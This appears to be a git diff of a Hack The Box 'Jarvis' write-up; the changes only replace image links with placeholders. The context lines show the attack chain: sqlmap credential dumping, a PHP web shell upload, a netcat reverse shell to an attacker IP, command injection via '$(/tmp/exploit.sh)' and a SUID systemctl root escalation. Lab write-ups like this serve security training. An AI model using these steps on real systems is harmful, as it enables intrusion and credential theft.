@@ -17,9 +17,9 @@ export target=10.129.229.137
 sudo nmap -p- --min-rate 1000 -sT -vvv $target
 ```
 
-<img width="433" height="61" alt="image" src="https://github.com/user-attachments/assets/81716739-b5c9-40d8-b973-bdaa2507751d" />
+<img width="433" height="61" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-1-Upload-To-Imgur" />
 
-<img width="441" height="131" alt="image" src="https://github.com/user-attachments/assets/16bedcd1-10d3-4291-96fb-e553cac23ebc" />
+<img width="441" height="131" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-2-Upload-To-Imgur" />
 
 
 **Scan Results:**
@@ -35,7 +35,7 @@ Following the initial discovery, detailed service enumeration was performed:
 sudo nmap -sC -sV -p 22,80 -T4 $target
 ```
 
-<img width="758" height="432" alt="image" src="https://github.com/user-attachments/assets/8f52b099-26c4-480f-8580-4cb95c28f3be" />
+<img width="758" height="432" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-3-Upload-To-Imgur" />
 
 **Service Details:**
 - **Port 22**: OpenSSH service
@@ -51,15 +51,15 @@ The web application hosted on port 80 was thoroughly examined:
 
 1. **Initial Access**: `http://10.129.229.137/index.php`
 
-<img width="961" height="720" alt="image" src="https://github.com/user-attachments/assets/8ff986fb-4f9a-4200-bc5c-a8c6e023ded3" />
+<img width="961" height="720" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-4-Upload-To-Imgur" />
 
 2. **Navigation**: Discovered "Rooms & Suites" section
 
-<img width="961" height="872" alt="image" src="https://github.com/user-attachments/assets/ef56fe0c-b0da-4eb0-9185-57a2dfec6292" />
+<img width="961" height="872" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-5-Upload-To-Imgur" />
 
 3. **Vulnerability Identification**: Found SQL injection vulnerability in room booking parameter
 
-<img width="775" height="692" alt="image" src="https://github.com/user-attachments/assets/9fc1b895-c489-4850-80e0-bbcba1a261eb" />
+<img width="775" height="692" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-6-Upload-To-Imgur" />
 
 ### SQL Injection Vulnerability
 
@@ -70,7 +70,7 @@ The parameter `cod` in the URL `http://10.129.229.137/room.php?cod=1` was found 
 http://10.129.229.137/room.php?cod=1'  # Produced error page
 ```
 
-<img width="775" height="692" alt="image" src="https://github.com/user-attachments/assets/3cfbf93f-c709-4de5-a1ba-7539a935e378" />
+<img width="775" height="692" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-7-Upload-To-Imgur" />
 
 ---
 
@@ -88,9 +88,9 @@ sqlmap -u "http://10.129.229.137/room.php?cod=1" --random-agent --batch
 sqlmap -u "http://10.129.229.137/room.php?cod=1" --random-agent --batch --users --passwords
 ```
 
-<img width="951" height="472" alt="image" src="https://github.com/user-attachments/assets/e1dc4f91-9807-46ea-ad01-b3a8ee6aa552" />
+<img width="951" height="472" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-8-Upload-To-Imgur" />
 
-<img width="554" height="183" alt="image" src="https://github.com/user-attachments/assets/67b87c3e-0dce-43a1-867f-a1c6db2948ef" />
+<img width="554" height="183" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-9-Upload-To-Imgur" />
 
 **Credentials Extracted:**
 - **Username**: DBadmin
@@ -109,7 +109,7 @@ A PHP web shell was created and uploaded through the SQL injection vulnerability
 sqlmap -u "http://10.129.229.137/room.php?cod=1" --random-agent --batch --file-write /home/aravinda/Documents/htb-machines/jarvis/exploit.php --file-dest /var/www/html/exploit.php
 ```
 
-<img width="951" height="314" alt="image" src="https://github.com/user-attachments/assets/1963c2e2-aa37-41cb-8ce1-8b58bac57aa8" />
+<img width="951" height="314" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-10-Upload-To-Imgur" />
 
 ### Reverse Shell Establishment
 
@@ -123,9 +123,9 @@ curl "http://10.129.229.137/exploit.php?cmd=id"
 curl "http://10.129.229.137/exploit.php?cmd=nc+-e+/bin/bash+10.10.14.106+4444"
 ```
 
-<img width="743" height="143" alt="image" src="https://github.com/user-attachments/assets/6f5b037d-b0e3-46f7-9441-103545ac2f2d" />
+<img width="743" height="143" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-11-Upload-To-Imgur" />
 
-<img width="523" height="344" alt="image" src="https://github.com/user-attachments/assets/f07c61e3-9594-4603-a3ad-c267a6ddbc66" />
+<img width="523" height="344" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-12-Upload-To-Imgur" />
 
 **Shell Access Obtained:**
 - **User**: www-data
@@ -144,7 +144,7 @@ Initial privilege escalation vectors were investigated:
 sudo -l
 ```
 
-<img width="661" height="136" alt="image" src="https://github.com/user-attachments/assets/72911f80-6c29-453c-a5ad-c27be6b2e77c" />
+<img width="661" height="136" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-13-Upload-To-Imgur" />
 
 **Discovery:**
 User www-data could execute the following command as user pepper without password:
@@ -183,9 +183,9 @@ sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
 # Input: $(/tmp/exploit.sh)
 ```
 
-<img width="410" height="268" alt="image" src="https://github.com/user-attachments/assets/92aa7007-f713-4e50-bb95-55b1e4d9ac5e" />
+<img width="410" height="268" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-14-Upload-To-Imgur" />
 
-<img width="465" height="156" alt="image" src="https://github.com/user-attachments/assets/0f09058b-2f0c-48be-a387-bfa2bd00eccd" />
+<img width="465" height="156" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-15-Upload-To-Imgur" />
 
 **Access Achieved:**
 - **User**: pepper
@@ -206,9 +206,9 @@ chmod +x linpeas.sh
 ./linpeas.sh
 ```
 
-<img width="466" height="125" alt="image" src="https://github.com/user-attachments/assets/906e44b1-95cf-4ef8-8014-297ecdfe0c8b" />
+<img width="466" height="125" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-16-Upload-To-Imgur" />
 
-<img width="638" height="258" alt="image" src="https://github.com/user-attachments/assets/7810e31f-d8ab-4bb1-be3f-926942447f0a" />
+<img width="638" height="258" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-17-Upload-To-Imgur" />
 
 
 **Critical Finding:**
@@ -216,7 +216,7 @@ chmod +x linpeas.sh
 -rwsr-x--- 1 root pepper 171K Jun 29  2022 /bin/systemctl
 ```
 
-<img width="954" height="459" alt="image" src="https://github.com/user-attachments/assets/c98214b6-208d-4be6-8e50-cf0416bd0bff" />
+<img width="954" height="459" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-18-Upload-To-Imgur" />
 
 
 ### Root Privilege Escalation
@@ -244,9 +244,9 @@ systemctl link /dev/shm/ara.service
 systemctl start ara.service
 ```
 
-<img width="519" height="328" alt="image" src="https://github.com/user-attachments/assets/ab2bafd2-7ad1-4728-aba7-66af9abfce0c" />
+<img width="519" height="328" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-19-Upload-To-Imgur" />
 
-<img width="631" height="579" alt="image" src="https://github.com/user-attachments/assets/811eb3bb-46ed-4ebc-beac-b99b776bb215" />
+<img width="631" height="579" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-20-Upload-To-Imgur" />
 
 **Root Access Achieved:**
 - **User**: root
